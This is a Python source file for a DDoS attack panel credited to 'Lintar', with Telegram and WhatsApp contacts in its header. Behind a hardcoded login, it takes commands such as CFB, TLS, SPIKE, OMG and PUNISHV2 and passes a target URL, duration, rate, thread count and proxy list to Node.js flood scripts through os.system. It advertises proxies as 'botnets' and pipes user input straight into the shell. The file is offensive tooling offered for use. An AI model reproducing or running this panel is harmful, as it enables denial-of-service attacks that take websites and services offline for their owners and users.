
## A NEAT AND FRESH NEW LOOK.             ##
## THIS FILE WAS CLEANING BY LINTAR!  ##
## ITS DDoS PANEL BY LINTAR!                    ##
## TELERAGM: @Lintar21                               ##
## WhatsApp: +6281247891005                  ##

import socket
import os
import requests
import random
import getpass
import time
import sys

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

proxy = open('proxy.txt').readlines()
bots = len(proxy)

def lod():
	print('Wait!')

def atas():
	print(' Its | Wellcome To Its DDoS Panel | Owner By: Lintar ')
	print('                      Botnets that we have : {bots}                      ')
	print('                         ProxyFile Name : text1.txt                         ')
	print("")

def logo():
	clear()
	atas()
	print(""" 
██▓▄▄▄█████▓  ██████       
▓██▒▓  ██▒ ▓▒▒██    ▒          Its DDoS Panel By: Lintar          
▒██▒▒ ▓██░ ▒░░ ▓██▄           Staff By: Van,Ganzi,Ibra,Stret
░██░░ ▓██▓ ░   ▒   ██▒                    
░██░  ▒██▒ ░ ▒██████▒▒       
░▓    ▒ ░░   ▒ ▒▓▒ ▒ ░
 ▒ ░    ░    ░ ░▒  ░ ░
 ▒ ░  ░      ░  ░  ░  
 ░                 ░  
                                      
 """)
	
def methods():
	clear()
	print("""
» Layer7: 

	TLS 
	SPIKE
    PUNISHV2
	OMG
	CFB
	
» Note: The methods will always be upgraded!
""")

def main():
    logo()
    while(True):
        cnc = input('''@Lintar\n ==>''')
        if cnc == "Methods" or cnc == "methods" or cnc == "METHOD" or cnc == "METHODS":
            methods()
        elif cnc == "Clear" or cnc == "CLEAR" or cnc == "CLS" or cnc == "cls":
            main()
		
# LAYER 7 METHODS
                
        elif "CFB" in cnc:
            try:
                target = cnc.split()[1]
                time = cnc.split()[2]
                Rate = cnc.split()[3]
                threads = cnc.split()[4]
                proxyFile = cnc.split()[5]
                os.system(f'node cfb.js {target} {time} {Rate} {threads} {proxyFile}')
            except IndexError:
                print('Usage: CFB <url> <time> <Rate> <threads> <proxyfile>')
                print('Example: CFB <https://EXAMPLE .com 120 512 1000 text1.txt')

        elif "TLS" in cnc:
            try:
                target = cnc.split()[1]
                time = cnc.split()[2]
                Rate = cnc.split()[3]
                threads = cnc.split()[4]
                os.system(f'node tls.js {target} {time} {Rate} {threads}')
            except IndexError:
                print('Usage: TLS <url> <time> <Rate> <threads> {proxyFile} ')
                print('Example: TLS <https://EXAMPLE .com 120 512 1000 text1.txt')

        elif "SPIKE" in cnc:
            try:
                target = cnc.split()[1]
                threads = cnc.split()[2]
                time = cnc.split()[3]
                os.system(f'node spike.js {target} {threads} {time}')
            except IndexError:
                print('Usage: SPIKE <target> <threads> <time>')
                print('Example: SPIKE example.com 95500 120')
                
        elif "OMG" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                rps = cnc.split()[3]
                thread = cnc.split()[4]
                os.system(f'node tlsv5.js {url} {time} {rps} {thread}')
            except IndexError:
                print('Usage: OMG <url> <time> <rps> <thread>')
                print('Example: OMG example.com 60 512 95500')

        elif "Punishv2" in cnc:
            try:
                target = cnc.split()[1]
                time = cnc.split()[2]
                os.system(f'node punishv2.js {target} {time}')
            except IndexError:
                print('Usage: punishv2 <url> <time> ')
                print('Example: punishv2 example.com 120')

        elif "Help" in cnc:
            print(f'''         
» Methods : To show methods 
» Clear: To clear all messages
            ''')
        else:
            try:
                cmmnd = cnc.split()[0]
                print("Command: [ " + cmmnd + " ] Not Found!")
            except IndexError:
                pass
                

# LOG-IN

def login():
    clear()
    user = "2"
    passwd = "2"
    username = input("Username: ")
    password = getpass.getpass(prompt='Password: ')
    if username != user or password != passwd:
        print("")
        print("Sorry, the password you entered is wrong!!!")
        sys.exit(1)
    elif username == user and password == passwd:
        print("Welcome to Its DDoS Panel!!!...")
        time.sleep(0.3)
        main()

login()